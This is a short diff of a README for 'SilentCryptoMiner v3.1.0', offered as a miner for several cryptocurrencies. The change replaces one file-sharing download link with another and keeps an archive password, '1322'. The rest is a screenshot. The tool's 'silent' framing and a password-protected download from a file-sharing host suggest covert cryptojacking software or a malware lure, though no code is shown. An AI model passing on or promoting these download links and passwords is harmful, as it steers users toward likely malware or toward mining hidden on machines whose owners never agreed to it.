@@ -1,7 +1,7 @@
 # SilentCryptoMiner v3.1.0 - Miner for ETH, ETC, XMR, RTM & many more
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322 
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
 
 <img width="1273" height="715" alt="Screenshot_1" src="https://github.com/user-attachments/assets/0a20fcde-8419-4477-a2b5-c93568c1faba" />
 
